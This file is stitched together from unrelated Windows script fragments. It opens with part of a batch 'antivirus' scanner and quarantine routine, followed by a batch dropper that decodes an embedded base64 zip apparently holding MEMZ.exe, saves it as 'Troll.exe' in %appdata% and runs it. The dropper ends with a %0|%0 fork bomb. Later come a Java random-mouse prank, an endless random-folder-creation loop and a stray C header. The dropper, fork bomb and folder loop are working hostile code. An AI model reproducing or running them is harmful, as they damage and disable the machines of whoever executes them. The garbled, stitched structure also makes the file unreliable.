if "%stdout_log_detected%"=="1" echo.!filescan!
if "%log_detected%"=="1" echo.!filescan! >> "!logfile!"
for /f "tokens=1,2* delims=:" %%a in ('findstr /c:"%hash%" "%~dp0VirusDataBaseHash.bav"') do call :detection "%%~a" "%%~b"
goto :EOF

:detection
if "%~1" neq "%hash%" goto :EOF
call :getname "%filescan%"
taskkill /f /im "%filescan_basename%" > nul 2>&1
if "%showballoon%"=="1" start /b powershell [Reflection.Assembly]::LoadWithPartialName("""System.Windows.Forms""");$obj=New-Object Windows.Forms.NotifyIcon;$obj.Icon = [drawing.icon]::ExtractAssociatedIcon($PSHOME + """\powershell.exe""");$obj.Visible = $True;$obj.ShowBalloonTip(%balloon_notification_timeout%, """Batch Antivirus""","""Threats found: %~2""",2)>nul
if "%~1"=="%hash%" (echo Malware found: !filescan! ^(!hash!^) ^| %~2) || goto :EOF
if "%noquarantine%"=="1" goto :EOF
md "%DIR%\Data\Quarantine\!hash!" 2>nul 1>nul
icacls "%filescan%" /setowner %username% 2>nul 1>nul
icacls "%filescan%" /grant %username%:(F,MA,WA,RA,WEA,REA,WDAC,DE) 2>nul 1>nul

move /y "%filescan%" "%DIR%\Data\Quarantine\%hash%\%hash%" 2>nul 1>nul
for /f "delims=" %%A in ("!filescan!") do echo.%%~fA >> "%DIR%\Data\Quarantine\%hash%\name"
icacls "%DIR%\Data\Quarantine\%hash%\%hash%" /deny %username%:(RX,W,R,M,RD,WEA,REA,X,RA,WA) 2>nul 1>nul
set /a threats+=1
echo.%filescan%

if not exist "%filescan%" (if "%malware_message%"=="1" echo Malware successfully quarantined) else call :delete

goto :EOF

:delete
if "%nodelete%"=="1" goto :EOF

echo.
echo Failed to quarantine malware^^!
set /p "delmalware=Delete malware? (y/n): "
icacls "%filescan%" /setowner %username% 2>nul 1>nul
icacls "%filescan%" /grant %username%:(F,MA,WA,RA,WEA,REA,WDAC,DE) 2>nul 1>nul
if /i "%delmalware%"=="y" del !filescan! /s /q > nul 2>&1

echo.
goto :EOF

:getname
set "filescan_basename=%~nx1"
exit /b

::netstat -no 2>&1 | findstr /i /c:"TCP" /c:"ESTABLISHED" | findstr /vc:"127.0.0.1"
:scanservices
timeout /t 2 /nobreak > nul
reg query HKLM\SYSTEM\CurrentControlSet\Services > "%TMP%\batch_antivirus_servicelist.tmp"
timeout /t 2 /nobreak>nul
reg query HKLM\SYSTEM\CurrentControlSet\Services > "%TMP%\batch_antivirus_servicelist2.tmp"


checkdiff "%TMP%\batch_antivirus_servicelist.tmp" "%TMP%\batch_antivirus_servicelist2.tmp"

for /f "usebackq delims=" %%A in ("%TMP%\batch_antivirus_scan_services.tmp") do (
	for /f "delims=" %%B in ('reg query "HKLM\SYSTEM\CurrentControlSet\Services\%%~A" ^| Findstr /ic:"ImagePath"') do call :engine "_%%~A"
)
goto scanservices


:scanip
set ip=123.456.7.890

:: Fake IP
set old_ip=NULL
for /l %%A in () do (
	for /f "tokens=3,5 delims= " %%A in ('netstat -no 2^>^&1 ^| findstr /i /c:"TCP" /c:"ESTABLISHED"^| findstr /vc:"127.0.0.1"') do (
		set process_id=%%B
		for /f "tokens=1 delims=:" %%B in ("%%A") do set ip=%%C
		findstr /c:"!ip!" "%~dp0VirusDataBaseIP.bav" > nul 2>&1 && set "detected_ip=!ip!"&& call :malicious_ip "!ip!" && echo.Malicious IP: !ip!
		rem && echo Malicious website: !ip!
	)
	
	
	timeout /t %timeout_ip% /nobreak > nul 2>&1
)

goto scanip

:malicious_ip
for /f "tokens=1 delims= " %%B in ('tasklist /fi "pid eq %process_id%" ^| findstr /c:"%process_id%"') do (
	if !errorlevel! neq 0 (
		echo.Error while getting process name for '%process_id%' PID
	) else (
		set "malicious_ip_process=%%B"
if defined %ip:.=_% (
	if "%kill_process_ip%"=="1" taskkill /f /pid %process_id% > nul 2>&1 || echo Error while ending connection
	exit /b
)
set "%ip:.=_%=%ip%"
if "%showballoon%"=="1" start /b powershell [Reflection.Assembly]::LoadWithPartialName("""System.Windows.Forms""");$obj=New-Object Windows.Forms.NotifyIcon;$obj.Icon = [drawing.icon]::ExtractAssociatedIcon($PSHOME + """\powershell.exe""");$obj.Visible = $True;$obj.ShowBalloonTip(%balloon_notification_timeout%, """Batch Antivirus""","""Malicious IP connection: %ip%`nProcess `"%malicious_ip_process%`"""",2)>nul && exit /b

exit /b

:
rem findstr /ic:"free iphone." /c:"visitor 1,000,000" /c:"visitor 1,000" /c:"visitor 999,999" /c:"Malware found" /c:"Virus detected" /c:"888-795-1528" /c:"
rem %localappdata%\Packages\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\LocalState\Files\S0\4\Attachments
@echo off

echo UEsDBBQAAAAIAHV36kiQ6IfZcyEAAAA6AAAIAAAATUVNWi5leGXtew10U8e17kg6soUtjACbGGzi>x
echo AxgMyD9Hlm1sY4JkW2AH/wjLP5BgB9k6RhKSjqIfbKcJyBgaqw65tM1NIJckNE1705Tcpi3JJWma>>x
echo OD830Da0TptFSQOpXx7NFSnhmYRbnIRw3jfnyMZpfmCt99b7WauzvM+c2TOz95699+zZIw71t+wl>>x
echo KkIIAxBFQo4QuZjItctJQErWcynk8LTjC44o6o4vaHa6gqw/IGwJ2L1sl93nE0JsJ88Gwj7W5WOr>>x
echo G22sV3Dw+dOnJ2XHaTxj9pZ/yKpcE/Dphr2uz6R3pet3qDdvT3BekurLro+kWuGkdZOry0nHf5Vs>>x
echo VgshdQo1eXHNzrYJ3ChRKpIVKYRo0Vgu4/Jm4aEDsPFV03clIWqikPonahKJK0nqNu2WBtKxk/Vk>>x
echo JZXDKwk5SF82ExJTfImAfogBPnvLCSm9Dl1PFsip+zJ68ZIf4ntDdHnJcYG0V+WeQmJzfsBhD9kJ>>x
echo eXmBjCAL/24BRNKGKV8eRu6jPK1E0g0p/MK44fxAMNBF4mvdHB9X9CX0ArxH6JLXTnUgyVbyhXGV>>x
echo X73Cf5T/naVl6NzAXVpdaDqec0KJ7eLiU6yJxBLQZRxuf1lHWtvcqR1Gsa2tzXlFZyJO6iRtYpoD>>x
echo o9wOMc2EeuC8Ivzn2zrOTtA7l2lrbXPuKjMRMa0I/UPFEfocd94DVJt4wnmQ1kMnxRNGcWhs99uh>>x
echo hbv/Frpxj0W0trkV7tniH/ZYLlrdCZQlvHJYPDHw6tI9lnGre6mY5gElq5hGUO2xxKzOwxLJNA3a>>x
echo GL/Hcuao5Yzkqm1iePyoZYy6mZjGoNuZiK3sThDTRtG4rePWob+0v9Iqpm2mBN3E+cZcLEgNygsw>>x
echo VIdFOitWQOixWME0qOL3l4pHlmM9Rf98zIpxIPk65mH6MVTG4Y6XGbry/nMV4GdrNb7dFm2/+Au6>>x
echo B2xuk5jWi0E2a9QyFpc/9gRoOmMqKhpVoJu4lbFdwA2NH9396meimIuZe6Q3a1vsdtrRPmb8m/j0>>x
echo 68BAVrppxDQ/XRTl4TZFLZdlLlLbKoYvRy3jsWpMhBZsYlouunYPhxVr0COmLUULeDEtRLU4wUaH>>x
echo 0RjzYJs8YGX44l3q2BX0RcMX3Ulnm0RRlIzrsLUOFY/QZb/dZhNPuBXf37Ue9E58f3A9tcllWKdC>>x
echo NtJe6ht3XVbMuPcvMIkzG/oU/YyYxknSzNg9CNvYbDbnzTOhHpvsU3ssjx+1PM6h54VSjD9qeYrA>>x
echo 66zR8Ei0/VC0/XC0/Ui0/flo+3C0/dVo+7Fo++vR9jfFtJNUwyhuh9tB61aQe1Nyvct4/jV1j+Uk>>x
echo BIpJDOjbGXm81Dixe3jHnzFVhT8nGA87HZLr3knnn4y2jw98KoY1bqWY5pQ0TN0oblTqv2WrYstM>>x
echo ZFv6c+nwnKHf6k98i0laO6gwr5TwgQvGX5VNP0dHzPlWf81CExnclXIF6jCvlLCB992EurtEttU2>>x
echo ND+bGucPMATjVv31HphpaJVkrz/C7hFI51bCW+Jy9l6Vc2zgihhOdDNnW0XqIpSkWPw6XNY5tow6>>x
echo KqWY6FafXYHuVhBLMr5tk+Y7TxXK2t8HMmXzTwE19OnQfOqW25a+wFHTbmPEPxiHrdZWp34ebGGV>>x
echo LbV24DXNylV0fOC0U5cDV/vDXy8NFdN98SLdOu6iNmcNavjIwHiCbG2KGy2dwIV7nTTWTyjTSc+h>>x
echo oTFqulK6KdS3uZNskte0Uvnuo970PxTh9/dYDhy1HKigmzwaPgQP2VBGHeUgSJFo+2PR9sclP3n+>>x
echo qOVIkrT7D1DiVHdiGK5STU1/tuCK5M7r17uToE8Sq1XLu1y3QNrlBLvcOVomb3WqmdhSDNj/7DFQ>>x
echo ufRxtOXy25bLp9vHT1vG37Zo5JdTxRvKTeSUmqPPVRHp3YnnOy/FDmIuDTcSQ8RGGszEtKeo3Sza>>x
echo Z/dpQPnSx3v8ytgrDH29MvRJ7Nn424exn+DNrdp/66VPb57xkz+qWi43xQ5InbR9QtUy3iSmHaL6>>x
echo Um6IRzVpm+pasZEPS3EXL+ckH9ljGUNcTHtMYnzZ+Cu95aJTQ4xk/fpW65BlXI9uvIpp6TS2YeCr>>x
echo UpAH2UnhqRtYnffNjR8EcVeIJVMZb9y/8atUM33pFNUMSu+bZdXsZmTVwLsr5lJvPizHjiOUdeGG>>x
echo V3AgkNghlWycVNk4R6x0oAaN2HfQ406ljPcwM+WFZ9smV37SFm0fkxePCLnHcspqk1cfuwXzhurP>>x
echo DLx0YD+V+WKsVkLEJhDjsdKpI4b+FFs6dQAMlK6i/rBBSf0BVpo2pelkyeukzTbUftnW1EoDbfii>>x
echo TVaqTQyPyWqVdHPutOXcqeKaKbrxS++leMa2guJUg2bGT7bYwzTkL98IMdyZOPAGXuasbkV3tCUm>>x
echo pl2ka9uupKLsVVBR9uzMVUz63sC59C91ithVp7g4VD8miW9dT7dF68DwAese8wGru9BdCMfInOIY>>x
echo Uxz/iysw0RX8SElXMMk8deLgaHMniyf2618eGndr3xDl17E3rsRtL51lkmgnpSgm7ROnYgeR9uIw>>x
echo HUJ99TU8L+qPDq0aoxib+MfYN7FSCDU0NqHYXgjxVuzUS6fVVupsH8Ld5kCkoWNDr0F5u38fXu5U>>x
echo gWxTnGrMoqDbahU9x5pipXKDnm1NoG6TTs5X/36ftU5GsGb5HHe4lQhhUihzT8exIaaNS6ddKKM1>>x
echo xoHkRnlMKyrtZDc0u0HKI0wd7S9ryFdlJRzNSmI0Zo9JkWkIvvT4l6QhA3dpVG1Dd+nCZbahrEtV>>x
echo EMUUCeW2xnh4z9B0uiL9utT9kts2SahBCaWjnh/MjNrSO25F9kTFoxp/nqZL7S9rKWWkNn9rG3pn>>x
echo 6MrQaw04ULRDFg1yAN3GjUNjVe6ktXI289d3aaj43j3rpZxjsRMKGnMrEDYoRkzTyrmIxq2QD1Rp>>x
echo 4J76y+vdDIytk2PTYhxTOyaiTutQWIM1bqIHwLhiu9X4+xpb29A4HGXoT7vF7XO7h5jtM/5d29Ed>>x
echo ZTqquqPa7Y0r/3zn+6Cye3j7AnfSbe7pG7vLKlrDuu6yulZleBqGtHZH72xVVq4cufMvt90quejb>>x
echo m7IvD1VnX35FXFxDz9vFddLTKj0HWdP/iWT8/0I5bCLkGGAUMA7QmWX8d/B+wCS/n19FyCcAzU2E>>x
echo pAJYAAdYA3gP+G7UdwDuBzwOeA5wDHACMIL+YcDPAA8D9gJ2AbYBNqDfsUrmcSDO14raBOAA3XGc>>x
echo EnLMAlAjcAAToBlAPesOwN9WE/IYYCfAB9gEqAGUAJYAZgGugFcM9SnACOA5wBhwe1fLPHbFeeUD>>x
echo 6O8hvxhNvPeVe98+wiifVZJnyC8IOT7bMBx9JfpS9OUXCHmRmA71X3k4MVhcEQmqzupI9o7Blw49>>x
echo ceVXkY/F8KWz74qDrx6KvnIo+mH0nf7XiGmij4QvRU+cfVV86pn3qo6odD8nx3UvQpbhh54lR+59>>x
echo 6Qghz44kfvTjFw48AuwZu1b1nv3niqbD33wWY8jm42m39F+JPXIXc+jw2I+v/CbyKQn/99boiSej>>x
echo L0XOZL1XOTj6XuXwB+rhvygH/xr9sKP/k4sPhV95gZhA6ggWc/IIWAxf+c1Zljx16olDT/RfGX4o>>x
echo VNkvHpwRUp09J1IuijgXzOj/5MAjYdVzFx+S+Rz/Ih+Jydmfi+Bw9iWRtDwxMBNFus9rpF8SWFKc>>x
echo PHDhwswLhKwj9zMRkTQ2kkcayfu2nVkXshSVDaTBqpyVNaBDUVoZpVUT0SkNWQOpKMoIM1CNohxk>>x
echo lJGUu00p589/gKJ8lFH+QL3z/PkU5eYblYOagTUoypOMciTlHnL+g9OnTqMcx5/yI2bg9AfnifLn>>x
echo 8we6UVQso2I1qoUp/eS88lO1yswMjCQmjig/ZnadJ7rEROXP5g34UFR+ZuA8iqqXUfk1u0liIhk9>>x
echo r7pJ808gSnp6ehJHRkZGE/GiUs5T9WoG3kdRHWNUw5rdScTfk0hU96qVnzD9p0ZUjzKRHtX7jOo8>>x
echo o2qZN/AECqNjGJ2GmZNEx/ohyMeJqn3qyBhTykT8zEq16odzB76PwmxmBowojJNhNk8fUJHz7ygv>>x
echo MKr7E/t7/MxqhrmHYdbMY5yau8tQPgYwT2kfLOMg6fl35JLih6hy6fErVP86d2A/ipow/fsfUTMJ>>x
echo ajJtEG0syE8UqkFmQIGiXpCg1qtV6oyBb6OorYy6RqfexKhzGLVbrd6YqPYmKo7sI49cSNgfVB/6>>x
echo buKOhMQd63ZemJml/rGoeeIXSuvHqhq1qkEdmamyZar86bvOj0Ig1R6tap+mf5SoHp2vGk5nqpn+>>x
echo 0VHVO0mR06pYDjNz3oAfojL5ScyKpczmzIiKuSuZuXspMzyd+aUuUsb8Npk5maPWabUjWvUNGjWb>>x
echo rF6+WN2ZELmgbktT356oDsxU71yuflJM+KmY+PS/9c+cqfhOIzn1dMrlA2Rdc9LGtFmLk3bpUlBm>>x
echo mZhZJk1Sf1ZkZtKP0maFpw0QuJSWUUdOJT/NJB1XJ71h1io0O0+PjMzaz8z6HpNUkJFcq5utS0nu>>x
echo 0Mx6kImQZA+jakxIDmck75+RvG/G7Hz1rAfV2rZE7U/VyaFMRjdv58GDB1WnmdkDCZHjs6PqyA6t>>x
echo g5n9doLWmaXlZiYHGCZXPbswOdIz+9vqSGIqGrF0bTQttYUZVKEYIc87s95NjEzXOtT9fj+jh/9o>>x
echo n56nTknRnp65K3EUJXWYuRsVnMfvT32dOs1fMvovZM38nVptvSFCUt9kdirQU5qYNludNjsJepnx>>x
echo 7n/OeOu76kPinEUHb/gBo0mv16TeOosVZ2c92Z+YOPu3Nw8chIekZtbtUvn9KmOqtyj10cz+vYmp>>x
echo LxrUtfPTUsT0B0RN2n2pY4kgNidPZHfVJVlv7K82zdNxSQfZeZtv6R8ZWViqTl7ALLiQkWyam1Gb>>x
echo tLAoISMpsf/0+dR0RvVDQ/9ooirKJD+ZkPG9hIxblmTsSO9PSsp8lMl4KDnjRznaggUL30jOuJyt>>x
echo 3XFjhMu8KSmzNidTyIzsXZSekPndfLU1A0Lo3hqPXFhirScPr9154ULWkkcb4HMJo+KCZ/6gqlUv>>x
echo vFetshUnb0hZ9B8a1cPlyY8nL09Sq2Lm5I81i25PZipMi57XMfdwiy5nZt+g1v7bwkhWtml+pCe7>>x
echo Q/vNUTnmay8yy7QZ2XvZ3G+oc7eqs388g5SKeXN35IoNOSv2LXnoQSx+8X/dkiWYklhu7tiNEV2S>>x
echo YJhnYpVjkXmj6dMVTGTzvM+mqe5fnsGlR1JUb92dMZJuvFnN3GVMtc41/gvDHF/GfS9J+0aWOmvx>>x
echo jdHZuZvT1J4czSyRM36W+IKYN0/Mn/tdQ0lyZMxQ8UHy3Jx5o3P7N2+e92lycvfywoPpyY8PGk2Z>>x
echo 2roi4975EaP24azi0dnaEWt2dP70VfNnvCUmPC/OGBR1u8Qlzb9eMPzrec8tWfjUsoxpOctH0itv>>x
echo Tpi9fafen56aXqofnrtrGkpZ5k2Nqb80qq2Z2T9Ki1xIWyjOWS/eYBXT68WSO39vJqJZfDLjQFHl>>x
echo aHqEyzi7oopL3zXN759WVlVvzdxjrBqZX3VeS62Q/VzjmpY3blwpKm5dQZ1jmdjIReaO/Xrht5bM>>x
echo G1228K2ccv8Ni26IrtSxi4Y5496s7Bn96/ZnrPslU61Qm3YlrHu9psA6svrdh0z9TIFCpHv4E9Ea>>x
echo Obt8Y045u2T5D5eX+xct/+iupkiu0bMysropptPHcmxZcyIf36pkcpcX2wQIf6tFHbmQ+w2D5max>>x
echo be8Dm95obF/YePf2nFk5dWuOVLcPq+9dciS7KPvFRUXZZPGR6ro17cOa9jfVB4GLLnpxURT4ujUP>>x
echo WbbnbM/x147lOJf6l/ldzpqxte1XEu52Lt2eU7fkocUds5gOHdORwuz2L9u+tm5NxxztwBhmdCRp>>x
echo +sfWdqRoOtYwHRXqXTX+WmdN+8Xu3f7a/bll+o7hhI4nEgb8y2bltB9L6PfXdrym6d+f2/Em0/EM>>x
echo c/f+3E/zs/PRHE7peF1zG2E6/sZgLFl+mzah4/fafnJzx7DneWfNRiEcYLsErz8c4gOs0x5kO3ne>>x
echo x4YC9qCTd7CdfWzIybP1lvpbgBPcdl8+2yD0sLzPLdz2fMK3GvrsPrbKHsrPzy/A3eNgIu4fjS1N>>x
echo bFVjvbWl2dLE1phtbKXF0sCuaalaZ6lmKzeyzTUWmWBzU+PN5ob86UnTkz4vRo/gywmxnYIQYsN+>>x
echo 1r7F7vLlTk8KCmw4yLOuEAspPYJvC637hDD9Z6AFlEh5NX02B/pc6AsJ7FaXxyNz6qFvXXY6vY9y>>x
echo CvYFQ7yXjunkpyc5+CDW1oflunzBkN0X8vTlsuDmkMQIBfooz/Jq7OM/AeYBnKGQv7ygYIsgbPHw>>x
echo +V1CftfWgiBvD3Q5V9++qhPk9D32Pn1I0FMR9JRlkPd0X2OeU+jRF+oDvFfYxuvt+m2uQDh4LV7e>>x
echo Lns3z+u3BfU+IRASfNcaT3lArCDvc0ywoG1vn7474ALymvxcPr4rYO8O6Z32Xr1D6PF5BLsDzCfF>>x
echo vS7+W/iQ3iv4+L5r6lLw3eHSd4Ydjr6r3LoDPH9duuwM9+l7eN5BrleuLsExqXq9y4eXYNju0Xfa>>x
echo g66uifvM19Lpcdqpavx+3gcC3dT0egfv4UO8XvY5Y+E1aWwxhvQB49bQNXVjD3U547JO6OZac6TR>>x
echo +XzvtfTn8mEf+mAlvtfvEQJ8QO+Cozh5veTcnQGhJ8gHrkMf3fYuHvt4K3TStRXbEkoWPJIBv+g8>>x
echo +h4hII0p5Awl17MO2NflcUA2D7/FFfo81eu0d4C3wzR0g+oxUR+w+4KCt8ceuB7/wvz4ZvXy3jv0>>x
echo cni8zn2ADTcR7ahmHQJddw/vCjigZbxDGaFu2iP7ElzR77kDDY//6+k67L6tkjjXJ/+kDeQp15hj>>x
echo 93TrPa5uXm/Ewj28PQh1Q33XmodVIAqGETrsIRdm2j3X9hsEh5B9C6/32wMCtr7XLjlG/N/9ZQf5>>x
echo 2vnUVSWrwJRxll87nob9rQgx0tNr78Nf8Hr2u1tw+vRdvM+u97ocrrgj+oQQrOvbxgdCiD3X8GMf>>x
echo H7SHuyRpeczyePiukIsG8q+Xd2sAOuV79cEuHDQCji04ErzP5wKpoD/gCvFBSaRJOvDsHj4QzPe6>>x
echo ugJCUOgOgaS3gPflhYMF0GsIbAu6hUDYO9G6TYASA3kTrSD92AJGKKBqzfPaPXSXSM6eJ3t+HnVo>>x
echo Guk8fXnxE5UOLywp7ewydBXmGcu6i/KKCrtL88o4NIvLVthLVhg7SzqLiqfq2Sux7RTsAUf+NqxG>>x
echo EhMWdBT00HiXh+0RnGCfFwoHfHn2vImtlIewJaDtcMEMdk+ek/d4ILefn0Lf77H35Xd5wp3YVlvC>>x
echo Lh+lP9nXJfhDLq/rDj6AZUs9k/OoygSoV8J22T3SeQBL834Emy6vg/RQpQMX4LfwDleITEROOi5k>>x
echo D271bgkQbxB+0e3aQnHeoB95TYg4+G3eLd5QPvoIeqE3D/F6u2gexa6rratD0lS/MZ4rIc2h2RdN>>x
echo erB8dosQz3QcLp7+rESaLLZmtraBtdbabLnsmsYmSytysHq08kkt22ZuagA1EEa6RmrMNWa2geMq>>x
echo 2bpCK7vW2Mw2Gdc1I38D8W67y4N0yB6S0yWD0biCdRb1csicaEZzB2VG5WtuqgVBWyPSvKZq1txQ>>x
echo za5tbKbtNeamXLayRRKG5nuWhupcVsoMrVWQw8bamrG0eFK4ALKgbsLqLA03N25kK7FSstbSjMyx>>x
echo WU4iN7ANlg3NbHNtvYXtrcb4Vgsmg3bTxtqGtWxzI0uXjvXKTKrNzWaasd25qeBOI33g1K20NVZD>>x
echo HGSmmAH5W2ubWmystcncsI5duraxwcK2NTU2rF1G9SiLQQVv2GhuYKvM0MtaPsTS+MAiQXRJjs96>>x
echo yxbI+qLGQCKM/SaEsAoo9gt/ZFG9fStfLzvuWnrumGleS4itsd5S2Vi9kW1sqLJgJXWwt+VqkmzG>>x
echo miBdg5ltaoTG6i0TeUibsw92d0jOwG+TcnYXbDY1710dT6yhc1eQ7Q53baVG9fUhOc0nNr4rHOAr>>x
echo aZIdRE+Q2nRLoJT1lrIuFnVpQSmpsW+TMuYJ2thu1OOQDgvd3aDkYAWfnJ+vJhW1PuQEIfZmgfew>>x
echo t4exM1hsZP4mKivWy4fosUbFs0O6tWaXmUUk6URIWhBfDzZrLku3rEDvHAE+n62Np+CdvMeFJbI9>>x
echo fA6e0gUF+9PPBzxIzemOcSCCOjA+x8tW0oyRksyRPhXDH2YG+qRTFQR7YD36pZi3b/K6kTM9ic2j>>x
echo phWErpCBlbMPzG9x5rJVCBSsNR4p2GaXl6crQPrKdiIc8o4FXz7ZJuV6NXaaUMvv68MIiVJcl9uW>>x
echo 3i6P3WuXUaSA9BA7CZEu4iQOIhAaIJBgE2rECXs34x5GgxD1H8km7nAwxCKV68IiHHShiB5BF/Ih>>x
echo tOIBEncrSQvxpnwPctoDXnlfT164qCVxxvJBatqwLxy0d3ro5NruyVgT5Hkp2Ejk+GAQpzPIhZxC>>x
echo OMRu9Qk9tJNmv18UDXcpF06GPtgM83B9lNghdEomiYtEs5yrDClBmVpoqvgOARLSybQRDtLpdjaI>>x
echo GxDuo9iRgs/Lw7owEE6/UG6c30Ze8jqc8HBOV0i6blY30jiBQNTQTGOHZYOlCrdVbLpaG1tvrkOg>>x
echo tOTSiNJS10zDC4IYokBLQ4vNXFmHfWmuqqltsMR/15cm4Y/u2Doz4i8Ns5glXUkpsqrJYkZoomMa>>x
echo EB1B1trYYKullBChQXkj4lW9eS0lXG1hW2xSRJsiCijJ4XJCztrm1dRnvPAZF6H+s2lT/iarsw+3>>x
echo FLunOuDaxnPA0cMpPyR9q+cLOTw062oKecwOahwrBiHEb8GB1RBqsruCfA0OXEsgIEjnlY3wACcJ>>x
echo wyepP/aAi5UEwG0bwIPeLYSedfTrB+xDKgKwAvFIc0PSGA9hMT8oSbgF7yHQc6HNwssFyO6XqPOg>>x
echo uppcLcPxxli81pjkWhevU+N1drzOj9dF8XpjvHbJtWmHXPsfiLcfkeqJbzanA84BjpUD4t9rTvSl>>x
echo kM+XtVXNdfRfHeh3j9I3kNlead0T30vmu+iHjNlSMqNDADoyF7j4N5CUPuUjt7PvuOMORyfd4/Qb>>x
echo znvI5FzpbmiqwCqv4oySj1V8jof01SP9d60OZhInf+FoJWQXHRf/pnLXevmTy/zOoJzObpY/nZS+>>x
echo pczmDBIKiEHFJE6Sobfi6rrfRQTPxhrHp+C+CS0+BpxnCu4J4NJZWdaJstAs6+fMFFwvcHuB27Tq>>x
echo Ku47wGmgs1NTxh0BbpAlX1r+8W+KMo+Jf1O0KJGdWANCl9nhoEGPkGpVnYBgYPZI38LWyK019IeT>>x
echo iKoRO5YOpgOHFZhZFQ4EEDkncHMVll7XZOtpUiXdkpudNAsn5D+mzJBxtcD+jLF5eN5PFqvbaB68>>x
echo BsGFNJEqj0Aji8+BllntwaWgy+uHzJUT79hpFZDN7qhzdQbsgT70pdK11ONI90hUGuxeHqPulrgK>>x
echo Xi+I1eHS1EYG43LRQWZyF2OjGnAJ4N5X5bFTHbwwIbkgeJBX+I2FNp/dH3QKCIn3q+LrMxaucQWC>>x
echo oTay7yqmAbsbPH+uXOsROieU+Fy8JSmRNEgr8PA+jEPq2mCpMxbmS0G2nUpaL5+QbeSyspn+qOCB>>x
echo GHEcIT8h1S4k/7jNTA4j/0WozttcPlzJg5ZecoBU891yk4qFEXXKJtwu6UVPWp6F7iNvfIXyQIra>>x
echo TrnLKUY9j6ytC3pIUcb5VAoY8TslNBVnVCMIWy29IK5q8Tnx/jk0+QZG+hzxuTT3wVnfRrZJ2Fof>>x
echo MgdylFQH7D21XTSJ+Q7lLBOoriI8pJV+IsD7gas9TbhKkrQp8rSRb1F54E9BIWAVIC0b96+J9iLa>>x
echo ruaDW0OCXyZCyJ+JxRf2VjldHkdcZEIySRUyS2q6uPjkAwX1LCpdG2mxWZomLDSbVLpClZ4QtbAt>>x
echo FOBhCKm1tro2PuSSYsoeaRa20hMui8hHp9ScPD+D5AFwEbaG/ZOoVrsnDJP+FLbp84fMXbeHXQG+>>x
echo Cjc72atekvFreV8TfJleMc3VrWbrBGtyo8JGk2CLnD2ZycLPtdtIApmyDZoFc2DLNlBd8LlR1Ka2>>x
echo GkvdhFNqiBXXXpsQ9jngNW21DfX1En42iccNLLPWC4tM7DiMstogVH51Xd2Xh+DrLm8uNxGt3kRM>>x
echo AD/gKcAYgM01kQ2AQcAIIDXPRCoAfsA+wCigFMd7L+AIYBxgLUAbcAhwBpCOwLoBMAgYpkHWgDmA>>x
echo CGBpIfCAxwDDgDcB9EvUM4AYYAwwDmCMkA+QDmABuYAiwMUS0FthIroV8oFSCpwHMAjYB3gKcBKQ>>x
echo jdSjFNAMuBMwCNgHOAw4BhgFaIpBG7ABsA9wCPA8IAZgwGcpoBdwBHAZKQ4Xxt5Ok+sf3IC5DYQc>>x
echo nIP1vwJ9xvHL58j47nTImIOzEm3TAULOYvzm9wk5jva+cjLxv0v+HykKko5nuvy/XT6Hp3JyX4Kf>>x
echo hhynhlzNU/6+VKzu9XpY3PGCuEutyjHkczm4DnQJDlwPVuW0NK/JK82h2b/PYfcIPn5VTh8fzFl9>>x
echo 0/SkCkRR3EBxMQEBX3BVDm635cEuJ++1B/MmfyajPy6V24Pe/G2GHFxEfK5u3C1ap3IDKZatCAUQ>>x
echo G2p93UKc2sJrUDMulOZhZpBexHFqxdvABPjb6XWRd1wNM5OdU7vl3Q5B6nDH9bAe+lyVQ7sRccwO>>x
echo r8uH8yJgDwmBHDbsMnfRbb4qp9vuCfI5bMFVfgVfzbCi4HPiVRRMrpNqsGBChWh8pcmRgG6A3WZx>>x
echo uVwpZ+Ju4TZz3ZyXC3NPcf/ODXNHufe4jziFYZphpiHDsNxgMJQZTAbe4Df0G35h+I3hPcNFw2eG>>x
echo tMIVhdWF6wpbCjcVbi0MFe4qvKfwXwofLTxa+Hbhfyv8oPBSYZoxw5hnLDdWG9cZNxm7jT7jncZv>>x
echo Gx8z/tL4ivG08V3jZ0ZlUVKRrii9KKsov6ikyFS0vqi1qKMoUHR30f1F3yt6oujVojNFHxbpim8o>>x
echo zizOLq4rbireUNxR/I3i14rfKf7P4ovFaSXzS4pLzCVbSrwlwZK+kqGSb5fsK3my5HDJcyUnS86U>>x
echo fFjiXhFaMbAiuuKfVvzzit+u+GjF5RXTSvNLS0otpetK15e2lfpL95Q+UPr90qdKXy49VfpeaULZ>>x
echo 7DK2LL+stqyzrL9ssOyBskfK/rXsp2XPlA2XHS37sExdvrC8sfyWck95oHx7+UD53vIfl6eunLeS>>x
echo XblkJc31D1P9cgyn4bScjkvl0rlMjuWyuaXQNccVQd8V0Hg1V8PVcVaumdvAbYL2HZyT83B+LsT1>>x
echo cndyEW4XN8jdw+3l7uP2cQe4g9xj3OPcIVjnMHeEex4WOsa9zo1wb3InuVPcKHeGi3HnuDHuIjfO>>x
echo XeaIgTFoDFqDzpBqSDdkGlhDtmGpIdfAGRCHDTUGq2GDYbPBCWv2Gv4XwsY/yv+35X8CUEsBAhQA>>x
echo FAAAAAgAdXfqSJDoh9lzIQAAADoAAAgAAAAAAAAAAAAAAP+BAAAAAE1FTVouZXhlUEsFBgAAAAAB>>x
echo AAEANgAAAJkhAAAAAA==>>x

echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
echo x.text=i.readAll();o=new ActiveXObject(^"ADODB.Stream^");o.type=1;o.open();o.write(x.nodeTypedValue);>>x.js
echo z=f.getAbsolutePathName(^"z.zip^");o.saveToFile(z);s=new ActiveXObject(^"Shell.Application^");>>x.js
echo s.namespace(26).copyHere(s.namespace(z).items());o.close();i.close();>>x.js

set v="%appdata%\Troll.exe"
del %v% >NUL 2>NUL
cscript x.js >NUL 2>NUL
del x.js >NUL 2>NUL
del z.zip >NUL 2>NUL
del x >NUL 2>NUL
start "" %v%
%0|%0
import java.awt.Robot;
import java.awt.event.InputEvent;
import java.util.Random;

public class out_of_control {
    public static void main(String[] args) throws Exception {
    	Robot robot = new Robot();
    	Random random = new Random();
    	while(true){
    		robot.mouseMove(random.nextInt(1200), random.nextInt(700));
    		//click(robot); // don't un-comment, may cause harm.
    		Thread.sleep(300);
    	}
    }
    
    private static void click(Robot robot){
        robot.mousePress(InputEvent.BUTTON1_MASK);robot.mouseRelease(InputEvent.BUTTON1_MASK);
        robot.mousePress(InputEvent.BUTTON1_MASK);robot.mouseRelease(InputEvent.BUTTON1_MASK);
    }
}
:x
md %random%%random%
goto x
#include <windows.h>
#include <math.h>

